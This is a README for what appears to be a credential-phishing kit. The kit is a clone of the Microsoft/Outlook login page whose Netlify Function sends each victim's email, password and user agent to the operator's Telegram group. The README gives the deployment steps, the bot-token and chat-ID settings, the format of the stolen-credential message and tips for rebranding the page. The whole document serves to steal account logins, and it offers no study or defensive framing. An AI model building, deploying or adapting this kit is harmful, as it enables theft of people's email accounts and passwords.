# Outlook-style login page (Telegram forwarding)

Clone of the Microsoft/Outlook login page. When a user enters email and password and clicks **Sign in**, a Netlify Function sends a message to your Telegram group with the email, password, and user agent.

## Deploy on Netlify

1. Push this repo to GitHub and connect it in [Netlify](https://app.netlify.com) (New site → Import from Git → choose the repo).
2. **Environment variables** (Site settings → Environment variables):
   - `TELEGRAM_BOT_TOKEN` — your bot token from [@BotFather](https://t.me/BotFather)
   - `TELEGRAM_CHAT_ID` — your group chat ID (e.g. `-1002714719334`)
3. Deploy. The function runs at `/.netlify/functions/send-telegram`; the form posts there.

Your Telegram group receives:

```
🔐 Login
Email: user@example.com
Password: ••••••••
User-Agent: Mozilla/5.0 ...
```

## Local dev

```bash
npm i -g netlify-cli
netlify dev
```

Create a `.env` file (see `.env.example`) with `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID`. Don’t commit `.env`.

## Customization

Replace `assets/logo.png`, `assets/favicon.ico`, and text in `index.html` for your branding.
